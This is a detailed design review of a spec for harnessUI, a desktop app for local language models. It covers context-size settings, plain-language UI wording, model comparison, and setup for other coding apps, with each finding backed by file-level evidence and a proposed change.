**Problem.** The audit log can only grow, so logging every request lets it grow without limit. Any local program can send requests without a key, and Claude Code calls count_tokens often; with one append-only row each, the audit table grows forever and fills the Audit log page.

**Evidence** (inferred). schema.rs:149-168: triggers abort any DELETE or UPDATE on audit_log; crates/store has no pruning code. How many requests there would be is my estimate.

**Proposed change.** Write audit rows only for authenticated requests to messages, responses and chat completions. Count refused requests in memory and show the count on the Other apps page. Do not audit count_tokens, or write at most one row per minute for it.

### [minor] WP0 Checks (e2e/m2_models.py 'needs the real small model')

**Problem.** The stated requirement for m2 is wrong. m2 searches Hugging Face and downloads SmolVLM-256M; it never uses Qwen3-0.6B.

**Evidence** (verified). e2e/m2_models.py:4 ('Needs network access to huggingface.co'), :29 (REPO). huggingface.co returned HTTP 200 from this machine today.

**Proposed change.** Reword to: 'm2 needs network access to huggingface.co (it downloads a ~300 MB model); if it cannot run, say why.'

### [minor] WP1 'Unverifiable here'; WP5 and WP6 acceptance

**Problem.** Several acceptance items cannot be checked on this machine, which has no GPU, no Windows and no macOS. Developers will either skip them without saying so or claim them. Items: GPU choices (All, As much as fits, device); step-down to As much as fits on a real out-of-memory; Save memory on Vulkan, CUDA, ROCm and Metal; Keep in memory actually locking memory (`ulimit -l` here is 8192 KiB, yet llama-server accepted `-lm mmap+mlock` and started without error, so a contract test only shows the flag parses); Automatic on a discrete GPU and on Apple unified memory; the Claude app setup and real Codex /v1/responses traffic (codex is not installed here; claude 2.1.322 is); the port-taken message and keychain on Windows and macOS; WP6 with Windows .cmd shims and the macOS login PATH (toolset.rs:113-190).

**Evidence** (verified). I ran all the claimed flags in one CPU launch of the pinned binary (`--device none --fit on -fa on -ctk q8_0 -ctv q8_0 -lm mmap+mlock --reasoning-budget 256 -c 4096`). It became healthy with n_ctx 4096, and the log reported nothing about mlock. `which codex` finds nothing. nproc is 4 and there is no GPU.

**Proposed change.** Move these into an 'owner hardware checklist' in the spec, with exact steps, separate from developer acceptance. Developer tests cover argument building, fixed hardware numbers and CPU contract runs only, and reports mark the rest unverified.


**Checked and sound:**
- All llama-server flags the spec names exist in the pinned b12110 build (help output): -lm auto/none/mmap/mlock/mmap+mlock/dio; --fit [on|off], default on, adjusts only unset arguments; -ngl defaults to 'auto', so leaving it out gives fitting; --reasoning-budget N>0 is a token budget; -ctk/-ctv accept q8_0; -fa on|off|auto; --alias takes a comma-separated list. All of them together started a healthy CPU server.
- --alias leaves /props model_path unchanged, so the start-up identity check in server.rs:357 survives.
- Catalog change is safe. The catalog structs do not deny unknown fields (catalog.rs:22-91), and validate only checks schemaVersion == 1 (catalog.rs:141). The signed-fixture tests use the fixture's own sequence 2 and a hard-coded current value of 1, independent of the bundled file (catalog.rs:381-414). release.yml:160-217 signs whatever catalog/models.json is committed and :264 compares bytes. scripts/catalog_test.py reads only known keys. Optional new fields plus sequence 2 keep all of this working.
- The summaries table (schema.rs:100-106) can store a re-folded summary without a schema change. TurnEvent::Compacted already carries the stage through turns.rs:1370-1378 to the frontend; app.ts:237 just ignores it.
- D11 can be built with the existing engine. Risk::AlwaysAsk gives a card with only Allow once and Deny in Ask mode (engine.rs:271-276), and keep_asking gives the same in Allow all (engine.rs:254-260). Nothing outside the policy crate matches on every Scope variant, so adding one is cheap.
- The e2e command shape {ctx, backend, device} (m1, m3, m5, m8, m9) keeps parsing if every new field gets #[serde(default)] and load_local_model's settings becomes Option.
- No unit test imports ModelsDialog or SettingsDialog, so the WP0 split can only break e2e (m2, settings-pages, m8, m9), which WP0 already checks.
- hyper 1.12 is already in Cargo.lock, so WP5's server dependency adds no new crate family. It still needs the deny and notices steps.


## Does it give the owner what they asked for, in words they understand (non-techni

### [major] Part 2, D2b and Storage (`localModel`): "an existing user's saved global size stays their default"

**Problem.** The owner may never get Automatic, which is the 'auto' half of request 1. The 0.0.4 Local models screen saves the whole settings object, context size included, every time the Backend menu changes. So anyone who ever picked a backend has `ctx: 8192` stored without ever choosing a size, and the builder cannot tell that apart from a size the user really chose. The owner is a 0.0.4 user who had Vulkan device trouble on this PC (fixed in 0.0.2), so picking a backend by hand is plausible. Under the rule as written they keep 8,192 for every model, Automatic never becomes their default, and they also stay under the 32,768 that WP5 says Claude Code and Codex need.

**Evidence** (verified). src/components/SettingsDialog.tsx:401-409: save() sends the whole object. :417-419: the Backend onChange sends `{...settings, backend}`, which carries ctx with it. The only writer of the key is set_local_model_settings (models_cmd.rs:105-117), called only from this screen (grep). The default ctx is 8192 (dto.rs, per map.md:14).

**Proposed change.** In D2b, replace the clause with: "A stored global ctx of exactly 8,192 (the 0.0.4 default, which the 0.0.4 screen saved whenever the backend changed) is read as Automatic. Any other stored size stays the user's default, and the first start after the update shows once in Settings → Local models: 'Every model now uses the size you chose before (N tokens). Choose Automatic to let the app pick the largest size that fits.'" WP1 adds a test for both readings.

### [major] D1 and WP2 (Model settings panel, "Load with settings…")

**Problem.** Request 1 literally asks for the setting 'on loading'. D1 keeps loading at one click, and the only place to choose at load time is "Load with settings…", which the spec never places. The most-used load path is the chat's model list: its 'On this computer' items and 'Open a GGUF file…' call pickModel directly. ModelPicker.tsx is in no package's Owns list, so nobody may add anything there. A newly opened file therefore loads at once with Automatic, and the owner only learns the result from a bare number in the header ('· 32,768 context'). In practice the owner looks for 'the memory setting when I load a model' and does not find it. Separately, the spec says the panel opens from 'the model chip … in the chat header', but the model chip is in the sidebar (Sidebar.tsx RuntimeChip), and it opens the Models dialog.

**Evidence** (verified). Spec lines 260-261 (no location given) and the WP2 Owns list (lines 254-258). src/components/ModelPicker.tsx:44-79 (items call choose/openFile directly). src/components/RuntimeIndicator.tsx:43-46 (the ready line shows only the number). Sidebar.tsx:10-18.

**Proposed change.** Add src/components/ModelPicker.tsx to WP2's Owns list. In WP2 Build, say: "Each 'On this computer' item in the chat's model list has a gear button 'Settings for <file>'. It opens the panel with a 'Load with these settings' button. Installed rows get 'Load with settings…' next to Use. After every load, the header's ready line names the memory and where it came from, e.g. 'Remembers about 24,000 words (Automatic) · Change', and Change opens the panel." Fix 'model chip in the chat header' to 'runtime indicator in the chat header'.

### [major] D3 (restart while a reply is being written) and WP2 (pickModel, Installed)

**Problem.** D3 asks first only for settings changes and Reload. Picking a different local model still stops the server at once if a reply is being written or another app is using the shared model. That covers the chat's model list, Installed → Use, Welcome's 'Pick up where you left off' and first run. The in-app reply then ends with 'Could not reach the model server…', and with item 3A, Claude Code's request dies with no warning. The model list is not disabled while a reply is written, so this is the most likely way the owner will meet the problem D3 is meant to fix.

**Evidence** (verified). ModelPicker.tsx has no disabled state during a reply. app.ts:392-403: pickModel → loadLocalModel. runtime_manager.rs:368: `self.unload().await` runs before anything else. The failure text is quoted in map-details.md:50.

**Proposed change.** Add to D3: "The same question appears when the user picks a different local model (model list, Installed → Use, Welcome, first run) while a reply is being written or another app is using the model." Add to WP2 Build: "pickModel and Installed use() call generation_busy (and the share-busy flag) first."

### [major] WP2 (runtime indicator, words.ts): "this is why it's slow"

**Problem.** The new 'As much as fits' option and the new step-down will make partly-on-the-processor loads common. Yet the spec gives no plain words for the two existing 'slow' warnings, and WP2's words.ts list covers only backends, load stages, step-down and failure messages, and context sizes. Today the screen says '12 of 33 layers on the GPU' or 'Loaded but slow (3.2 tokens/s)'. The only explanation is a hover tooltip full of jargon ('CPU', 'quantization', 'spilled into system memory', 'another backend'), which keyboard and touch users never see. The owner will see that it is slow but not why or what to do. Nothing says the first reply after Apply and restart is slow because the chat is reread. A speed/quality preset is not needed if these explanations exist.

**Evidence** (verified). src/components/RuntimeIndicator.tsx:48-63 (the warnings and their title= tooltips). Spec lines 274-277 (the words.ts scope). map.md:100 (a reload loses the prompt cache).

**Proposed change.** Add to WP2: "Slow states are visible text with a reason and one action, never only a tooltip, with speed in words per second:
- part of the model on the processor: 'Part of the model runs on the processor, so replies are slower. Save memory or a smaller memory size lets more fit on the graphics card.'
- after a step-down: 'Running on the processor because the graphics card ran out of memory. Reload to try the graphics card again.'
- slow on the graphics card: 'Replies are slow here (about N words a second). The graphics card may be short of memory. Try a smaller memory size or a smaller model.'
- after a restart: 'The first reply after a restart takes longer while the model rereads the chat.'
words.ts has a phrase for each, covered by its unit test."

### [major] WP2 (Installed rows, runtime indicator states) and D2b (Automatic floor): the model is too big for this computer

**Problem.** Three missing states.
(a) Installed rows still have no fit mark, so the owner can press Use on a model that cannot fit, then sit through a long load, a step-down and a failure without being warned.
(b) Automatic never goes below 4,096, and the spec does not say what the owner sees when even 4,096 does not fit.
(c) The indicator menu (Reload, Model settings…, Unload) is described only for the ready line. Today the indicator draws nothing after an unload and only red text after a failure, which are exactly the states where Model settings is needed. After the new Unload, the message box falls back to 'The model is not loaded. Pick it again from the list above.'

**Evidence** (verified). RuntimeIndicator.tsx:8 and :70 return null (stopped state). :67-69 show only 'Model failed to load'. map.md:288: Installed models have no fit verdict, and the spec does not add one. ChatView.tsx:136-137.

**Proposed change.** Add to WP2:
- "Installed rows show the fit mark at the model's resolved settings (model_load_info)."
- "Use on a model marked Too large asks first: 'This model probably needs more memory than this computer has. Load it anyway?' (Cancel / Load anyway)."
- "When not even the smallest size fits, the panel says: 'Too large for this computer, even with the shortest memory. Try Save memory, As much as fits, or a smaller download.'"
- "The indicator keeps its menu when the load failed ('Didn't load · Model settings…') and when unloaded ('Unloaded to free memory · Load')."
- "The message box after Unload says: 'The model was unloaded to free memory. Load it again from the list above.'"

### [major] D2a, D4 and WP3: 'auto compresses' can't be found, and the final failure is jargon

**Problem.** The owner asked for the memory setting 'and it auto compresses' in the same sentence, but compression shows only inside chats (the divider and passing notes). Neither the Model settings panel nor the defaults for all models says that long chats are summarised automatically, so someone who opens the setting to check finds nothing. When compression is not enough, the chat still ends with 'This conversation no longer fits the model's context window of N tokens, even after older tool results were shortened and earlier messages summarised…', and the meter reads 'X / Y tokens (P%)'. That gives three names (context window, tokens, How much it can remember) for one idea, and no button to fix it. WP3 owns runner.rs but is not asked to reword it, and crates/agent/src/error.rs is owned by nobody.

**Evidence** (verified). crates/agent/src/turn/runner.rs:653. crates/agent/src/error.rs:80-86. src/components/ChatView.tsx:33-54 (meter and its title). Spec D4 line 111 and WP3 Owns (lines 285-293).

**Proposed change.** In D4, give the context control this fixed help line: 'How much of the chat the model can see at once. When a chat gets longer than this, older messages are summarised automatically so it can keep going.' In WP3: add crates/agent/src/error.rs to Owns, and reword the full and overflow failures to 'This chat is too long for the model to remember, even after summarising. Start a new chat, or let this model remember more in Model settings.' with a Model settings button (tests change under D7). Change the meter title to 'How much it can remember: X of Y tokens used'.

### [major] Shared contracts (`CompareEntry`, `compare_facts(items, ctx)`) and WP4b ('Add to comparison' on Browse results)

**Problem.** A Browse result is a repository, and a GGUF repository holds many files (for example Q2_K to Q8_0, from 3 GB to 30 GB, with or without an image projector). 'Download size', 'Will it run well…' and 'Can it read images?' all depend on which file is meant. The spec never says what an item is, so each developer will guess (first file, smallest file…). Scenario: the column shows the smallest file as 'Fits' while the file the owner would actually download does not fit.

**Evidence** (verified). Spec lines 171-173 (CompareEntry not specified), 338-342 and 354-360. hub_repo runs the fit check per file (map-details.md:243). RepoDetail shows a fit badge per file.

**Proposed change.** In Shared contracts, define an item as exactly one of {catalogId} | {repo, file} | {installedPath}. In WP4b: "Adding from a Browse result or a repository page uses the file the user picked on the detail page, else the largest file marked Fits at the comparison size, else the smallest. The column names the file in plain words ('Q4_K_M: smaller file, good quality') and has a Change menu listing the repo's files."

### [major] WP4a (`catalog_list`, catalog matching) and WP4b (no catalog list on screen)

**Problem.** WP4a builds catalog_list and curated text for the 14 entries, but no WP4b screen lists catalog entries: 'Add to comparison' exists only on Browse, repository pages and Installed. 'The publisher says' therefore appears only if the owner happens to search one of those exact repositories. The map's match rule (repo + file) cannot match a Browse result, which has no file, or another uploader's copy of the same model, such as a different uploader's quant of Qwen3.5 9B against the catalog's unsloth/Qwen3.5-9B-GGUF. Most catalog entries are re-uploads (unsloth/*, ggml-org/*), so this case is common.

**Evidence** (verified). Spec WP4a lines 338-342 and WP4b lines 353-355. catalog/models.json repos (listed by script: 9 of 14 are unsloth or ggml-org). map.md:45 and :58 (repo + file matching; the 'catalog list' was dropped from the UI).

**Proposed change.** WP4b: "While the Compare tab has fewer than 4 models it shows 'Suggested models' from catalog_list (name, fit mark, Add to comparison)." WP4a: "A catalog entry's text also applies to a Hugging Face repo whose base model (cardData.base_model or a base_model: tag) is the entry's source model. A Browse result matches by repo alone when every catalog entry for that repo is the same model. Text matched this way is labelled 'The publisher says (about the original model)'."

### [major] WP4b row list: 'what they're good at' for models outside the catalog

**Problem.** For the models the owner actually browses (almost none are among the 14), 'What is it good at?' can only come from uploader tags. GGUF re-uploads mostly carry format tags (gguf, imatrix, conversational, text-generation), so most columns will say 'Chat' or 'Not known'. Meanwhile WP4a collects parameters, activeParameters, publisher, languages and released for the catalog, and Hugging Face already supplies the parameter count, base model and languages, yet the WP4b row list shows none of them. Those are the facts a non-technical owner could use to tell models apart.

**Evidence** (inferred). Spec WP4a field list (lines 323-326, 332-333) compared with the WP4b rows (lines 356-360). map-details.md:242 (parse_repo_detail keeps the gguf parameter total). The claim about how sparse re-upload tags are is inferred from map.md:299.

**Proposed change.** Add these WP4b rows:
- "Who made it?": catalog publisher, else the base model's owner, labelled 'The uploader lists'.
- "How big is it?": e.g. '9 billion parameters. Bigger models are usually smarter but slower.' For a MoE model: '35 billion, using 3 billion at a time, so it runs faster than its size suggests.'
- "Languages".
- "Made from": base model.
- "Released or last updated".
Add a 'Show model card' link on Hugging Face columns. When only format tags exist, 'What is it good at?' says 'No description from the publisher in this app. Read the model card.' rather than 'Chat'.

### [major] D6 (1) and WP4a (filling the catalog `summary` and `goodAt`)

**Problem.** WP4a tells the developer to write the summary and goodAt fields for the 14 entries from the publishers' cards. The developers in this release are coding agents (Part 1 sets their Bash timeouts and report format), so this text is a model's paraphrase of a card, which is what D6 forbids at runtime. It would then be labelled 'The publisher says', telling the owner the publisher wrote it, and no person reviews it before it ships in the signed catalog.

**Evidence** (inferred). Spec D6 (lines 126-131), WP4a (lines 327-330), Part 1 lines 34-36 and 79-84. map.md:331 originally said the content is 'written by the owner or a maintainer'.

**Proposed change.** In D6 and WP4a: "`summary` is a short verbatim quote (at most 2 sentences) from the publisher's card, with `source`. Each goodAt key is backed by a quoted phrase from that card, listed in the report. The lead shows the 14 entries to the owner before release. The label is 'From the publisher's model card'."

### [major] WP5 setup cards (Claude Code, Codex, the Claude app)

**Problem.** Following the cards as written would take over the owner's other apps for good, with no way back explained. A Claude Code env block in the user settings file sends every Claude Code session to the local model. A Codex provider set as model_provider in config.toml makes Codex always use it. The Claude app's third-party inference setting replaces Claude for all its chats. The owner asked for this 'upon user request' and presumably uses these apps with their own accounts. The cards also don't give the file location per system (%USERPROFILE%\.claude\settings.json on Windows versus ~/.claude on the Mac), don't say what to do when the file already has settings (pasting a second JSON object breaks Claude Code's settings), and don't say that harnessUI must stay open with a model loaded.

**Evidence** (inferred). Spec lines 398-403. map-details.md:374-386 and 403-406 (env block in ~/.claude/settings.json, model_provider in ~/.codex/config.toml, Developer Mode gateway). How the apps behave comes from the documentation summarised there; not run here.

**Proposed change.** In WP5: "Each card first offers a one-session way, with Windows (PowerShell) and Mac (Terminal) tabs. For Claude Code: commands that set the variables and start claude in that window only. For Codex: a [profiles.harnessui] block used with `codex --profile harnessui` (confirm the flag in official docs). The settings-file way comes second, with the full path for each system and 'If the file already has settings, add only the lines inside "env".' Every card ends with: 'To go back to your <app> account, remove these lines (or close the window).' and 'Keep harnessUI open with a model loaded while you use it.'"

### [major] WP6 (fixed argument templates, 'the task is one argument') on the owner's Windows PC

**Problem.** On Windows, Claude Code and Codex installed with npm are `claude.cmd` / `codex.cmd` scripts, which can only run through cmd.exe. The app's existing helper for such scripts refuses any argument that contains a double quote, %, CR or LF, because no quoting is safe. A task written by the model almost always has line breaks or quotes, so on the owner's PC most 'ask Claude Code / Codex' calls would fail, or a developer would be tempted to build a shell string. The e2e test puts a Linux fake program on PATH, so it would not catch this.

**Evidence** (inferred). crates/mcp-host/src/winquote.rs:20-23 (refused characters) and :1-8 (.cmd must run inside cmd.exe). crates/runtime/src/spawn.rs:726 (PATHEXT makes a name resolve to .cmd). Spec lines 430-431 and 442-445. That the owner's copies are npm installs is inferred.

**Proposed change.** In WP6: "Pass the task on standard input, not as an argument (confirm in each program's official docs that its non-interactive mode reads the prompt from stdin), so .cmd scripts work. Program detection uses PATHEXT. Add a unit test with a task containing quotes, % and line breaks. List 'run on Windows with npm-installed claude/codex' under Unverifiable for the owner's PC."

### [major] D2b (Automatic), WP1 (already-loaded check, `same_in_progress`), WP2 ('Settings changed. Restart the model to use them.')

**Problem.** Automatic is a number worked out from free memory at that moment: available RAM for the processor, the probe's free graphics memory, with the loaded model counted as free. WP1 is told to compare every launch-relevant field, and today's already-loaded check compares the resolved size. When free memory moves (a browser opens, the probe is refreshed), Automatic gives a different number. Picking the already-loaded model then reloads it for nothing, losing the prompt cache, and the header nags 'Settings changed. Restart the model to use them.' although the owner changed nothing.

**Evidence** (inferred). src-tauri/src/models_cmd.rs:70-80 compares `current.n_ctx == Some(settings.ctx)`. src-tauri/src/hub.rs:116-117 uses `available_bytes`, and the free graphics memory comes from the cached probe. Spec WP1 line 236 and WP2 line 269. The effect is inferred, not run.

**Proposed change.** Add to D2b/WP1: "Automatic is resolved once per load. The already-loaded check, same_in_progress and the 'loaded copy is older' flag compare the saved choice (Automatic or a fixed size) and the other fields, not the size Automatic produced. The panel and the ready line say what it chose: 'Automatic: 24,576 tokens (about 18,000 words) on this computer right now.'"

### [minor] D4 (settings shown, in plain words)

**Problem.** D4 requires one help line per control but supplies none.
- Defaults are unstated for Keep the model in memory and How long it may think.
- The Keep in memory text 'uses more memory' is inaccurate: locking doesn't use more, it stops the computer reclaiming that memory. On the 16 GB Mac this can squeeze every other app.
- 'Use the graphics card' is confusing on a Mac, which has no graphics card.
- Which graphics card: the owner's PC lists two devices (built-in Radeon graphics and the RX 9070 XT), and the option labels aren't specified, so 'Vulkan0' could leak.
- How long it may think needs a restart, while the chat's Thinking button works at once, and nothing explains the difference.

**Evidence** (verified). Spec lines 109-123 and 264. crates/runtime/src/llama/devices.rs:304-316 (picks the discrete card by default). ChatView.tsx Thinking toggle (map-details.md:533). The app's help style is 'what it does, when it matters, what you can do' (SettingsDialog.tsx StepsPerTurn).

**Proposed change.** Add the exact help lines to D4:
- Use the graphics card: 'The graphics card is much faster than the processor. As much as fits puts the rest on the processor, which is slower.' On Macs, label it 'Use Apple graphics'.
- Save memory: 'Lets the model remember more in the same memory. Answers may be slightly less accurate.'
- Keep the model in memory: 'Stops the computer from moving the model out of memory, so replies don't pause after a break. Other programs get less memory. Not recommended with 16 GB or less.' Off by default.
- Which graphics card: options like 'AMD Radeon RX 9070 XT · 16 GB (recommended)' and 'AMD Radeon Graphics · built into the processor'.
- How long it may think: 'Longer thinking can give better answers but takes more time. Needs a restart. To turn thinking off for one chat, use the Thinking button above the chat.' Default: Default.
Fit marks reuse the FitBadge words (Fits / Fits with limits / Too large).

### [minor] D3 (the restart question)

**Problem.** The question has only 'Stop and restart' and 'Wait'. There is no way to back out, although every other confirmation in the app has Cancel first. 'Wait' doesn't say what happens next, and a long agent turn may take many minutes. The same text 'A reply is being written' is used when another app is the one using the model, which is wrong in that case.

**Evidence** (verified). Spec lines 105-108. AllowAllButton.tsx:101, BackendDownloads.tsx:168 and ClearTaskDialog.tsx:16 all put Cancel first.

**Proposed change.** Buttons: Cancel / Restart when it ends / Stop and restart. While waiting, the indicator shows 'Restarts when the reply ends · Cancel'. When another app is the user: 'Another app is using the model. Stop its request and restart the model?'

### [minor] WP3 (failed summary, divider wording)

**Problem.** 'A failed summary is reported in plain words' gives no words, so each developer invents them. 'Earlier messages are summarised for the model.' doesn't say which messages, or whether the model still sees them.

**Evidence** (verified). Spec lines 299-302. runner.rs:772-788 (fails silently today).

**Proposed change.** Divider: 'Above this line, the model sees a summary instead of the messages. Show summary'. Failure note: 'Could not summarise earlier messages. The reply goes on, but this chat may run out of room soon.'

### [minor] WP4b (Compare screen states and labels)

**Problem.** Several states and labels are missing or off.
- No empty state for the Compare tab.
- No rule for adding a 5th model.
- No wording for 'needs the internet', a Hugging Face rate limit (429), or a gated repo without a token.
- 'Will it run well on this computer?' promises speed, but the verdict is a memory estimate only.
- The row label 'Licence' differs from the app's visible spelling 'license'.

**Evidence** (verified). Spec lines 356-362. crates/models/src/fit.rs:124-195 (memory only). BackendDownloads.tsx:164 'Read the license' and SettingsDialog.tsx:82 'Licenses'.

**Proposed change.** Empty: 'Nothing to compare yet. Choose Add to comparison on a model in Browse or Installed.' When full: the button is disabled, with 'You can compare up to 4 models. Remove one first.' Offline: 'These facts need the internet. They are saved once the model is downloaded.' Rate limit: 'Hugging Face is busy. Try again in a minute.' Gated: 'This model needs a Hugging Face token. Add one in Settings → Hugging Face.' Rename the rows to 'Will it fit on this computer?' and 'License'.

### [minor] WP6 (Coding apps tool group and card)

**Problem.** Several states and lines are missing.
- 'Offered only when found' leaves the group missing with no explanation; the Tools panel already explains a missing browser instead.
- 'Not signed in' has no plain message.
- A run of several minutes shows no progress or elapsed time.
- The card doesn't say it uses the owner's plan or credit.
- The card doesn't say the feature is experimental (D5).
- D8 doesn't plainly allow the app names in ToolsPanel.tsx labels, so a cautious developer may write 'a coding app'.

**Evidence** (verified). src/components/ToolsPanel.tsx:247-251 and :271ff (the 'no browser' note pattern). Spec lines 424-436 and 134-139. map-details.md:431 (billed to the user's account).

**Proposed change.** Group: 'Coding apps (experimental)'. When neither program is found: 'Claude Code and Codex are not installed on this computer.' When not signed in: 'Claude Code is not signed in. Open it once and sign in, then try again.' The card adds 'It uses your <app> plan or credit and can take several minutes.' and 'It can change files in <folder>.' or 'It can only read files in <folder>.' While running: '<App> is working… 2 min · Stop'. Extend D8 to the user-facing labels in ToolsPanel.tsx, OtherApps.tsx and the approval card.

### [minor] WP5 (32,768 warning, key and port wording)

**Problem.** The button 'that sets 32,768 for this model' may set a size that doesn't fit, leading to a failed load or a slow step-down. 'Give this model at least 32,768 tokens to remember' is awkward and uses jargon. 'Make a new key' doesn't warn that apps already set up stop working. The context value in the Claude Code setup goes stale when the size changes. A loading model gets the same 'No model is loaded' error as no model at all.

**Evidence** (verified). Spec lines 381, 388-389 and 395-397. map-details.md:378 (CLAUDE_CODE_MAX_CONTEXT_TOKENS).

**Proposed change.** Warning: 'Claude Code and Codex send long instructions. Set How much it can remember to at least 32,768 tokens (about 24,000 words) for this model.' The button shows the fit mark; when it doesn't fit: 'This model can't remember that much on this computer. Try Save memory or a smaller model.' New key: 'Apps set up with the old key stop working until you copy the new one.' Size change: 'You changed how much this model can remember. Copy the setup again.' While loading: 'The model in harnessUI is still loading. Try again in a minute.'

### [minor] D2c and WP1 (Save memory on the owner's graphics cards)

**Problem.** Save memory on Vulkan (RX 9070 XT) and Metal is unverified. If it makes the load fail, the step-down goes to As much as fits and then to the processor, still with Save memory on. The owner ends up slow on the processor without knowing that Save memory caused it.

**Evidence** (inferred). map.md:175 and map-details.md:82 (quantized cache needs flash attention; kernel support varies by backend). Spec line 251.

**Proposed change.** WP1: "When a load fails with Save memory on, retry once on the same backend with it off before stepping down, and tell the user: 'Save memory doesn't work with this graphics card, so it was turned off for this model.' (The saved per-model value is changed only by the user.)"


**Checked and sound:**
- D1: keying per-model settings by file name and size (not path or backend) covers files opened with 'Open a GGUF file…' and survives moving a file. It follows the existing evals/profile.rs pattern.
- D2a: per-stage notes fix the real bug that the single note in src/store/app.ts:237-241 says 'summarised' even for stages 1 and 3.
- D4 hides threads, batch sizes, slots, rope, tensor split and free-text arguments, and allows only typed values from fixed lists. The setting names ('How much it can remember', 'Use the graphics card', 'Save memory', 'Keep the model in memory', 'More options') are plain and match the app's style.
- words.ts backend labels ('Graphics card (Vulkan)', 'Processor only (slower)', …) replace the raw 'vulkan · Vulkan0' text (RuntimeIndicator.tsx:31, Welcome.tsx:76). The unit test that every backend kind and stage has a phrase is a good guard.
- Trying 'As much as fits' before the processor makes the existing out-of-memory advice in failure.rs:55 true.
- By default the owner's RX 9070 XT is picked over the built-in Radeon graphics (devices.rs:304-316), so the 'Which graphics card' control can sit safely under More options.
- The Compare tab lives in the Models dialog, next to the Hugging Face browsing the owner named. Rows phrased as questions, each with its source and 'Not known' instead of guesses, fit a non-technical reader.
- D6 rules out publisher benchmark numbers and model-written card summaries in the app, which keeps the comparison honest.
- D11 / WP6: the card on every call with 'It runs online with your <app> account. What it reads is sent to <company>.' is plain and says that data leaves the computer.
- WP5 strings 'Let other apps on this computer use the loaded model', 'No model is loaded in harnessUI. Open harnessUI and load a model.' and 'Port N is used by another program. Choose another port.' are short and plain and use no exclamation marks.
- Both directions of item 3 are off by default behind their own switch and marked experimental (D5), which matches the owner's answer and 'upon user request'.
- No user-facing string in the spec uses an exclamation mark.
